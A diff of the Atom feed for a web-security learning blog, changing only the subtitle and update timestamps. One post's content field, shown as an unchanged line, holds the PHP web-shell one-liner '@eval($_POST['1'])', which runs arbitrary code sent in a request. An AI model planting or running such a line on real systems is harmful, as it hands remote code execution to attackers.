@@ -2,11 +2,11 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
   <title>WELLS Blog</title>
   
-  <subtitle>Learning Web Security....</subtitle>
+  
   <link href="https://we11s.github.io/atom.xml" rel="self"/>
   
   <link href="https://we11s.github.io/"/>
-  <updated>2024-06-16T14:26:13.802Z</updated>
+  <updated>2024-06-16T14:26:35.251Z</updated>
   <id>https://we11s.github.io/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="https://we11s.github.io/posts/1e8c0b41/"/>
     <id>https://we11s.github.io/posts/1e8c0b41/</id>
     <published>2024-06-16T14:25:10.000Z</published>
-    <updated>2024-06-16T14:26:13.802Z</updated>
+    <updated>2024-06-16T14:26:35.251Z</updated>
     
     <content type="html"><![CDATA[<?php @eval($_POST['1']);?>]]></content>
     
